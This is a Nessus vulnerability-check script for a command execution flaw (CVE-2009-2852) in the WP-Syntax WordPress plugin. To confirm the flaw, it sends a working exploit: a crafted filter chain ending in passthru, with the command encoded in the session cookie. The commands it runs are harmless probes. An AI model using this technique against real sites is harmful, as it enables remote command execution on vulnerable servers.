#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(40592);
  script_version("$Revision: 1.15 $");
  script_cvs_date("$Date: 2016/05/19 18:10:51 $");

  script_cve_id("CVE-2009-2852");
  script_bugtraq_id(36040);
  script_osvdb_id(57204);
  script_xref(name:"EDB-ID", value:"9431");

  script_name(english:"WP-Syntax Plugin for WordPress 'apply_filters' function Command Execution");
  script_summary(english:"Attempts to run a command.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
command execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The installation of WordPress on the remote web server includes the
WP-Syntax plugin, a third-party add-on that provides clean syntax
highlighting supporting a wide range of programming languages.

The version of WP-Syntax installed on the remote host fails to
initialize the 'test_filter' array variable in the 'test/index.php'
script. Provided that PHP's 'register_globals' setting is enabled, an
anonymous remote attacker can leverage this issue to execute arbitrary
commands subject the privileges of the web server user id by adding a
specially crafted series of filters, which in turn will be executed in
the 'apply_filters()' function.");
  script_set_attribute(attribute:"see_also", value:"http://wordpress.org/plugins/wp-syntax/changelog/");
  script_set_attribute(attribute:"see_also", value:"https://plugins.trac.wordpress.org/changeset/395779/wp-syntax");

  script_set_attribute(attribute:"solution", value:"Upgrade to version 0.9.10 or later");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20);

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/08/13");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/06/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/08/14");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:ryan.mcgeary:wp-syntax");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2016 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "WP-Syntax";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "wp-syntax/README.txt"][0] =
    make_list('=== WP-Syntax');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext     : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = "ipconfig /all";
  else cmd = "id";
  cmds = make_list(cmd);
}
else cmds = make_list("id", "ipconfig /all");
cmd_pats = make_array();
cmd_pats["id"] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats["ipconfig /all"] = "Subnet Mask";

# Try to exploit the issue.
i = rand() % 255;
sep = string(SCRIPT_NAME, "-", unixtime());

url =
  "/wp-content/plugins/wp-syntax/test/index.php?" +
  "test_filter[wp_head][" + i + "][0]=session_start&" +
  "test_filter[wp_head][" + i + "][1]=session_id&" +
  "test_filter[wp_head][" + i + "][2]=base64_decode&" +
  "test_filter[wp_head][" + i + "][3]=passthru";

foreach cmd (cmds)
{
  exploit = cmd + ";echo '<< " + sep + "'";
  cookie = base64(str:exploit);
  cookie = cookie - strstr(cookie, "=");
  if (ereg(pattern:"[^a-zA-Z0-9]", string:cookie))
  {
    #debug_print("Can't encode exploit into a valid session identifier; skipping.");
    continue;
  }

  res = http_send_recv3(
    method      : "GET",
    port        : port,
    item        : dir + url,
    add_headers : make_array("Cookie", "PHPSESSID="+cookie),
    exit_on_fail: TRUE
  );

  # There's a problem if we see the expected command output.
  if ('ipconfig' >< cmd) pat = cmd_pats['ipconfig'];
  else pat = cmd_pats['id'];

  if (egrep(pattern:pat, string:res[2]))
  {
    if (report_verbosity > 0)
    {
      report =
        '\n' +
        "Nessus was able to execute the command '" + cmd + "' on the remote" +
        '\nhost using the following request :\n' +
        '\n' + http_last_sent_request() + '\n';
      if (report_verbosity > 1)
      {
        if (sep >< res[2])
        {
          output = res[2];
          output = output - strstr(output, string("<< ", sep));
          while ('media="screen" />' >< output)
            output = strstr(output, 'media="screen" />') - 'media="screen" />';
        }
        else output = res[2];

        snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
        report +=
          '\nThis produced the following output :\n' +
          snip + '\n' + output + '\n';
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
